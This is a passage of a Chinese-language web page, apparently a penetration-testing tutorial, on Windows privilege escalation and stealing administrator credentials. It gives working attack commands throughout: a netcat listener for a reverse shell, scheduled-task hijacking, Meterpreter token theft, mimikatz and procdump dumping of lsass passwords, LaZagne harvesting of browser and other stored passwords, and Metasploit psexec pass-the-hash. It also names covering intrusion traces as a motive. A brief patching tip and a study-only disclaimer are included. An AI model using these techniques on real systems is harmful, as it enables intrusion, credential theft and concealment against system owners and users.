+<p><strong>obj：</strong>指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。
+<strong>password：</strong>指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p>
+<p><strong>⑤、重启服务</strong></p>
+<pre><code>net start DcomLaunch 
+</code></pre>
+<p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p>
+<pre><code>nc.exe -vv -l -p 4433
+</code></pre>
+<h3 id="_9">六、计划任务</h3>
+<p><strong>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</strong></p>
+<pre><code class="language-CMD">#查看计算机的计划任务
+schtasks /query /fo LIST /v
+#查看指定目录的权限配置情况
+accesschk.exe -dqv &quot;D:\test&quot; -accepteula
+</code></pre>
+<h3 id="meterpreter">七、Meterpreter基础提权</h3>
+<p><strong>首先在Meterpreter会话执行ps命令查看目标机当前进程：</strong>
+假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，假设PID为2584：
+然后我们可以执行以下语句窃取该用户进程的令牌：</p>
+<pre><code>steal_token  2584
+</code></pre>
+<h2 id="_10">溢出漏洞安全防范</h2>
+<p><strong>及时通过Windows Update或第三方工具360更新补丁</strong></p>
+<h2 id="_11">提权后获取管理员密码</h2>
+<p>虽然我们已经有了管理员权限，但是我们最好是再获取管理员密码，原因如下</p>
+<ol>
+<li>很多管理员账号密码都设置成一样的，攻下一台就可以拿下所有</li>
+<li>远程连接时，比如使用木马，很容易被发现或者清理</li>
+<li>如果用管理员账号，可以清除渗透痕迹</li>
+<li>正规渗透测试过程中，都是取得管理员账号密码，登录3389端口或反端口连接者证明为成功</li>
+</ol>
+<blockquote>
+<p>简单地说就是从获取管理员权限——&gt;获取管理员账号</p>
+</blockquote>
+<h3 id="1_1">1、本地管理员密码如何直接提取</h3>
+<h4 id="1mimikatz">①、直接通过mimikatz读取管理员密码</h4>
+<blockquote>
+<p>mimikatz，很多人称之为密码抓取神器，它的功能很多，最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。
+<strong>win10无效</strong></p>
+</blockquote>
+<pre><code class="language-cmd"># 提升权限
+privilege::debug
+# 抓取密码
+sekurlsa::logonpassWords
+</code></pre>
+<p>当无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码，具体步骤如下</p>
+<pre><code class="language-cmd"># 导出lsass.exe进程为lsass.dump文件
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp 
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+</code></pre>
+<h4 id="2lazagne-python">②、Lazagne 需要本地支持python</h4>
+<blockquote>
+<p>LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。
+LaZagne 几乎支持市面上大部分常用工具。包括浏览器、Git、SVN、Wifi、Databases 等。
+但是对聊天软件的支持不够本土化，主要支持一些国外的聊天软件。</p>
+</blockquote>
+<pre><code class="language-cmd">laZagne.exe all  #获取所有密码
+laZagne.exe browsers  #只获取浏览器记住的密码
+laZagne.exe all -oN  #将输出保存到文件    
+</code></pre>
+<p>-oN表示是纯文本格式（正常的）的输出，和屏幕打印内容相同；还可以写成-oJ，JSON格式的输出，更便于程序解析；或者写成-oA，同时输出两种格式。</p>
+<h3 id="2hash">2、本地Hash远程直接登录</h3>
+<hr />
+<p>高版本的系统，密码不是明文的情况下，直接通过哈希值来取得管理员账号。主要通过MSF提供的exploit/windows/smb/psexec模块来完成</p>
+<pre><code class="language-sh">msf&gt;use exploit/windows/smb/psexec
+msf&gt;set rhost #目标IP 
+msf&gt;set SMBUser administrator  #目标账号
+msf&gt;set SMBPass aaaaaa:bbbbbb  #目标哈希值
+msf&gt;exploit 
+msf&gt;shell
+</code></pre>
+<h3 id="3hash">3、Hash密钥暴力破解</h3>
+<hr />
+<ol>
+<li>通过LC5暴力hash密码
+   使用gmer直接提权SAM和system文件或用Pwdump7提取hash后，最后使用LC5破解</li>
+<li>使用ophcrack破解系统hash密码
+   ***.com</li>
+</ol></div></article><nav class="pager"><a class="pg prev" href="../system-privilege-escalation/"><span>上一篇</span><b>系统提权</b></a><a class="pg next" href="../linux-privilege-escalation/"><span>下一篇</span><b>linux系统提权</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
